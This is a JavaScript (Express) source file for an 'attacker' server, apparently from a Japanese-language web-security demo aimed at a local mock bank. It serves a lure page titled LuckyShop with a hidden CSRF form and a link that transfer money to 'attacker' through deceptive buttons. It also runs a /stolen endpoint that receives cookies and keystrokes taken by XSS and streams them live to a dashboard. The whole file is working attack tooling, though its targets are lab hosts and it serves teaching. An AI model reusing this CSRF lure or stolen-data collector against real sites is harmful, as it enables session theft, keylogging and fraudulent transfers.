// attacker.local:3001
const express = require('express')
const app = express()

const sseClients = []

function broadcast(data) {
  sseClients.forEach(c => c.write(`data: ${JSON.stringify(data)}\n\n`))
}

app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream')
  res.setHeader('Cache-Control', 'no-cache')
  res.setHeader('Connection', 'keep-alive')
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.flushHeaders()
  sseClients.push(res)
  req.on('close', () => sseClients.splice(sseClients.indexOf(res), 1))
})

app.get('/', (req, res) => res.send(attackerPage()))

function attackerPage() {
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>LuckyShop</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; padding: 60px 24px; gap: 12px; }
  .btn { display: block; width: 320px; padding: 16px; font-size: 16px; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; text-align: center; text-decoration: none; }
  .btn-primary { background: #ff6b35; color: #fff; }
  .btn-secondary { background: #f0f0f0; color: #333; }
  .log { width: 320px; background: #111; border-radius: 8px; padding: 10px; font-family: monospace; font-size: 12px; color: #7fb3f5; min-height: 48px; line-height: 1.8; margin-top: 24px; }
  .log-clear { background: none; border: 1px solid #444; color: #666; font-size: 11px; padding: 3px 8px; border-radius: 4px; cursor: pointer; margin-top: 4px; }

</style>
</head>
<body>

<!-- CSRF POST -->
<form id="csrfForm" method="POST" action="http://bank.local:3000/transfer" style="display:none">
  <input name="to" value="attacker">
  <input name="amount" value="3000">
</form>
<button class="btn btn-primary" onclick="document.getElementById('csrfForm').submit()">プレゼントを受け取る</button>

<!-- CSRF GET -->
<a href="http://bank.local:3000/transfer-get?to=attacker&amount=2000" class="btn btn-secondary">お得な情報はこちら</a>

<!-- 受信ログ -->
<div class="log" id="log-area"><span style="color:#444">待機中...</span></div>
<button class="log-clear" onclick="document.getElementById('log-area').innerHTML='<span style=color:#444>待機中...</span>'">クリア</button>


<script>
var logArea = document.getElementById('log-area')
var initialized = false
var es = new EventSource('http://attacker.local:3001/events')
es.onmessage = function(e) {
  var data = JSON.parse(e.data)
  if (!initialized) { logArea.innerHTML = ''; initialized = true }
  if (data.type === 'cookie') {
    var line = document.createElement('div')
    line.style.cssText = 'padding:2px 0'
    if (data.value.startsWith('（空')) {
      line.innerHTML = '<span style="color:#f39c12">Cookie: 空（HttpOnly）</span>'
    } else {
      line.innerHTML = '<span style="color:#e74c3c">Cookie: </span><span style="color:#2ecc71">' + escHtml(data.value) + '</span>'
    }
    logArea.appendChild(line)
  } else if (data.type === 'key') {
    if (logArea.querySelector('.key-line') === null) {
      var kline = document.createElement('div')
      kline.className = 'key-line'
      kline.style.cssText = 'padding:2px 0'
      kline.innerHTML = '<span style="color:#e74c3c">Keys: </span><span class="key-buf" style="color:#2ecc71"></span>'
      logArea.appendChild(kline)
    }
    var buf = logArea.querySelector('.key-buf')
    if (data.value === 'Enter') buf.textContent += '↵'
    else if (data.value === 'Backspace') buf.textContent = buf.textContent.slice(0, -1)
    else if (data.value.length === 1) buf.textContent += data.value
  }
  logArea.scrollTop = logArea.scrollHeight
}
function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
}
</script>
</body></html>`
}

// XSS で盗まれたデータを受け取るエンドポイント（デモ用）
app.get('/stolen', (req, res) => {
  if (req.query.c !== undefined) {
    const cookie = req.query.c || '（空 — HttpOnly が有効なため読めない）'
    console.log(`\n💀 盗まれたCookie: ${cookie}\n`)
    broadcast({ type: 'cookie', value: cookie })
  }
  if (req.query.key !== undefined) {
    const key = req.query.key
    process.stdout.write(key === 'Enter' ? '\n' : key)
    broadcast({ type: 'key', value: key })
  }
  res.set('Access-Control-Allow-Origin', '*')
  res.send('ok')
})

app.listen(3001, () => {
  console.log('attacker: http://attacker.local:3001')
})
